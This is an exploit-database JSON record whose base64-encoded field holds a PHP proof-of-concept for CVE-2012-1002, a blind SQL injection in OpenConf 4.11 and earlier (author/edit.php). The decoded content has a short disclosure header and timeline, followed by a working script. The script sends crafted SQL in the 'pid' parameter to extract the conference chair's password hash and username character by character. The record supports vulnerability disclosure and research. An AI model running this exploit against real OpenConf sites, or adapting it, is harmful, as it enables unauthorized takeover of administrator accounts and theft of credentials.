{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogIE9wZW5Db25mIDw9IDQuMTEgKGF1dGhvci9lZGl0LnBocCkgUmVtb3RlIEJsaW5kIFNRTCBJbmplY3Rpb24gRXhwbG9pdA0KICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgDQogIGF1dGhvci4uLi4uLi4uLi4uLi4uLjogRWdpZGlvIFJvbWFubyBha2EgRWdpWA0KICBtYWlsLi4uLi4uLi4uLi4uLi4uLi46IG4wYjBkMTNzW2F0XWdtYWlsW2RvdF1jb20NCiAgc29mdHdhcmUgbGluay4uLi4uLi4uOiBodHRwOi8vd3d3Lm9wZW5jb25mLmNvbS8NCiAgYWZmZWN0ZWQgdmVyc2lvbnMuLi4uOiBmcm9tIDQuMDAgdG8gNC4xMQ0KICANCiAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogIHwgVGhpcyBwcm9vZiBvZiBjb25jZXB0IGNvZGUgd2FzIHdyaXR0ZW4gZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2Ugb25seS4gICAgfA0KICB8IFVzZSBpdCBhdCB5b3VyIG93biByaXNrLiBBdXRob3Igd2lsbCBiZSBub3QgcmVzcG9uc2libGUgZm9yIGFueSBkYW1hZ2UuIHwNCiAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogIA0KICBbLV0gVnVsbmVyYWJsZSBjb2RlIGluIC9hdXRob3IvZWRpdC5waHA6DQogIA0KICAxMDQuCQkvLyBnZXQgc3ViDQogIDEwNS4JCSRhbnIgPSBvY3NxbF9xdWVyeSgiU0VMRUNUICogRlJPTSBgIiAuIE9DQ19UQUJMRV9QQVBFUiAuICJgIFdIRVJFIGBwYXBlcmlkYD0iIC4gc2FmZVNRTHN0cigkX1BPU1RbJ3BpZCddKSkgLi4uDQogIDEwNi4JCWlmIChteXNxbF9udW1fcm93cygkYW5yKSAhPSAxKSB7DQogIDEwNy4JCQllcnIob2NfKCdTdWJtaXNzaW9uIElEIG9yIHBhc3N3b3JkIGVudGVyZWQgaXMgaW5jb3JyZWN0JykpOw0KICAxMDguCQl9DQogIDEwOS4JCSRfUE9TVCA9IGFycmF5X21lcmdlKCRfUE9TVCwgbXlzcWxfZmV0Y2hfYXNzb2MoJGFucikpOw0KICANCiAgVXNlciBpbnB1dCBwYXNzZWQgdGhyb3VnaCAkX1BPU1RbJ3BpZCddIHNlZW1zIGNvcnJlY3RseSBzYW5pdGlzZWQgYnkgdGhlIHNhZmVTUUxzdHIoKSBmdW5jdGlvbiwgYnV0IGluIHRoZSBxdWVyeQ0KICBhdCBsaW5lIDEwNSwgIHNpbmdsZSBxdW90ZXMgYXJlbid0ICB1c2VkIGJlZm9yZSAgY29uY2F0ZW5hdGUgdGhlIHVzZXIgaW5wdXQgIGludG8gdGhlIHF1ZXJ5IHN0cmluZy4gIFRoaXMgY2FuIGJlDQogIGV4cGxvaXRlZCB0byBjb25kdWN0IGEgIEJsaW5kIFNRTCBJbmplY3Rpb24gIGF0dGFjay4gIFN1Y2Nlc3NmdWwgZXhwbG9pdGF0aW9uIG9mICB0aGlzIHZ1bG5lcmFiaWxpdHkgcmVxdWlyZXMgYXQNCiAgbGVhc3QgYSByZWNvcmQgaW50byB0aGUgJ3BhcGVyJyB0YWJsZSwgYW5kICdFZGl0IFN1Ym1pc3Npb24nIHRvIGJlIGVuYWJsZWQuDQoNCiAgWy1dIERpc2Nsb3N1cmUgdGltZWxpbmU6DQogIA0KICBbMjcvMDEvMjAxMl0gLSBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyZWQNCiAgWzAxLzAyLzIwMTJdIC0gSXNzdWUgcmVwb3J0ZWQgdG8gYnVncyhhdClvcGVuY29uZi5jb20NCiAgWzAyLzAyLzIwMTJdIC0gVmVyc2lvbiA0LjEyIHJlbGVhc2VkOiBodHRwOi8vd3d3Lm9wZW5jb25mLmNvbS9uZXdzLyMyMDEyMDIwMg0KICBbMDIvMDIvMjAxMl0gLSBDVkUgbnVtYmVyIHJlcXVlc3RlZA0KICBbMDIvMDIvMjAxMl0gLSBBc3NpZ25lZCBDVkUtMjAxMi0xMDAyDQogIFswMi8wNS8yMDEyXSAtIFB1YmxpYyBkaXNjbG9zdXJlDQogIA0KKi8NCg0KaWYgKCFleHRlbnNpb25fbG9hZGVkKCdjdXJsJykpIGRpZSgiY1VSTCBleHRlbnNpb24gcmVxdWlyZWRcbiIpOw0KDQplcnJvcl9yZXBvcnRpbmcoRV9FUlJPUik7DQpzZXRfdGltZV9saW1pdCgwKTsNCg0KZnVuY3Rpb24gaHR0cF9nZXQoJHBhZ2UpDQp7DQogIGdsb2JhbCAkY2gsICRhcmd2Ow0KCQ0KICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkYXJndlsxXS4kcGFnZSk7DQogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9HRVQsIHRydWUpOw0KDQogIHJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCn0NCg0KZnVuY3Rpb24gaHR0cF9wb3N0KCRwYWdlLCAkZGF0YSkNCnsJDQogIGdsb2JhbCAkY2gsICRhcmd2Ow0KCQ0KICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkYXJndlsxXS4kcGFnZSk7DQogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsNCiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRkYXRhKTsNCg0KICByZXR1cm4gY3VybF9leGVjKCRjaCk7DQp9DQoNCmZ1bmN0aW9uIGhleF9lbmMoJHNxbCkNCnsNCiAgZm9yICgkaSA9IDAsICRuID0gc3RybGVuKCRzcWwpOyAkaSA8ICRuOyAkaSsrKQ0KICAgICRlbmNvZGVkIC49IGRlY2hleChvcmQoJHNxbFskaV0pKTsNCiAgcmV0dXJuICIweHskZW5jb2RlZH0iOw0KfQ0KDQpwcmludCAiXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiOw0KcHJpbnQgIlxufCBPcGVuQ29uZiA8PSA0LjExIFJlbW90ZSBCbGluZCBTUUwgSW5qZWN0aW9uIEV4cGxvaXQgYnkgRWdpWCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1xuIjsNCg0KaWYgKCRhcmdjIDwgMikNCnsNCiAgcHJpbnQgIlxuVXNhZ2UuLi4uLi46IHBocCAkYXJndlswXSA8dXJsPlxuIjsNCiAgcHJpbnQgIlxuRXhhbXBsZS4uLi46IHBocCAkYXJndlswXSBodHRwOi8vMTI3LjAuMC4xLyI7DQogIHByaW50ICJcbkV4YW1wbGUuLi4uOiBwaHAgJGFyZ3ZbMF0gaHR0cDovL2xvY2FsaG9zdC9vcGVuY29uZi9cbiI7DQogIGRpZSgpOw0KfQ0KDQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1ZFUkJPU0UsIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCg0KaWYgKCFwcmVnX21hdGNoKCcvaHJlZj0iYXV0aG9yXC9lZGl0LnBocCIvJywgaHR0cF9nZXQoJ29wZW5jb25mLnBocCcpKSkgZGllKCJcblstXSBGYWlsZWQ6IHN1Ym1pc3Npb24gZWRpdCBkaXNhYmxlZFxuIik7DQoNCiRpbmRleCA9IDE7DQokaGFzaCAgPSAnJzsNCiRjaGFycyA9IGFycmF5X21lcmdlKHJhbmdlKDQ4LCA1NyksIHJhbmdlKDk3LCAxMDIpLCBhcnJheSgwKSk7IC8vIDAtOSBhLWYNCg0KcHJpbnQgIlxuWy1dIENoYWlyIHBhc3N3b3JkIGhhc2guLi46ICI7DQoNCndoaWxlICghc3RycG9zKCRoYXNoLGNocigwKSkpDQp7DQogIGZvciAoJGkgPSAwLCAkbiA9IGNvdW50KCRjaGFycyk7ICRpIDw9ICRuOyAkaSsrKQ0KICB7DQogICAgaWYgKCRpID09ICRuKSBkaWUoIlxuWy1dIEV4cGxvaXQgZmFpbGVkIVxuIik7DQogICAgJHNxbCA9IHVybGVuY29kZSgiLTEgT1IgMT0oU0VMRUNUIElGKEFTQ0lJKFNVQlNUUih2YWx1ZSx7JGluZGV4fSwxKSk9eyRjaGFyc1skaV19LDAsMSkgRlJPTSBjb25maWcgV0hFUkUgc2V0dGluZz0iLmhleF9lbmMoIk9DX2NoYWlyX3B3ZCIpLiIpIExJTUlUIDEjIik7DQogICAgaWYgKHByZWdfbWF0Y2goIi9pcyBpbmNvcnJlY3QvIiwgaHR0cF9wb3N0KCJhdXRob3IvZWRpdC5waHAiLCAib2NhY3Rpb249MSZwaWQ9eyRzcWx9IikpKSB7ICRoYXNoIC49IGNocigkY2hhcnNbJGldKTsgcHJpbnQgY2hyKCRjaGFyc1skaV0pOyBicmVhazsgfSANCiAgfQ0KICAkaW5kZXgrKzsNCn0NCg0KJGluZGV4ID0gMTsNCiR1c2VyICA9ICcnOw0KJGNoYXJzID0gYXJyYXlfbWVyZ2UoYXJyYXkoMCksIHJhbmdlKDk3LCAxNzIpLCBhcnJheSg5NSksIHJhbmdlKDQ4LCA1NykpOyAvLyBBbnkgIndvcmQiIGNoYXJhY3Rlcg0KDQpwcmludCAiXG5bLV0gQ2hhaXIgdXNlcm5hbWUuLi4uLi4uLjogIjsNCg0Kd2hpbGUgKCFzdHJwb3MoJHVzZXIsY2hyKDApKSkNCnsNCiAgZm9yICgkaSA9IDAsICRuID0gY291bnQoJGNoYXJzKTsgJGkgPD0gJG47ICRpKyspDQogIHsNCiAgICBpZiAoJGkgPT0gJG4pIGRpZSgiXG5bLV0gRXhwbG9pdCBmYWlsZWQhXG4iKTsNCiAgICAkc3FsID0gcmF3dXJsZW5jb2RlKCItMSBPUiAxPShTRUxFQ1QgSUYoQVNDSUkoU1VCU1RSKHZhbHVlLHskaW5kZXh9LDEpKT17JGNoYXJzWyRpXX0sMCwxKSBGUk9NIGNvbmZpZyBXSEVSRSBzZXR0aW5nPSIuaGV4X2VuYygiT0NfY2hhaXJfdW5hbWUiKS4iKSBMSU1JVCAxIyIpOw0KICAgIGlmIChwcmVnX21hdGNoKCIvaXMgaW5jb3JyZWN0LyIsIGh0dHBfcG9zdCgiYXV0aG9yL2VkaXQucGhwIiwgIm9jYWN0aW9uPTEmcGlkPXskc3FsfSIpKSkgeyAkdXNlciAuPSBjaHIoJGNoYXJzWyRpXSk7IHByaW50IGNocigkY2hhcnNbJGldKTsgYnJlYWs7IH0gDQogIH0NCiAgJGluZGV4Kys7DQp9DQpwcmludCAiXG4iOw0KPz4=", 
    "filename": "platforms/php/webapps/18820.php", 
    "id": "18820", 
    "cves": [
        "CVE-2012-1002"
    ]
}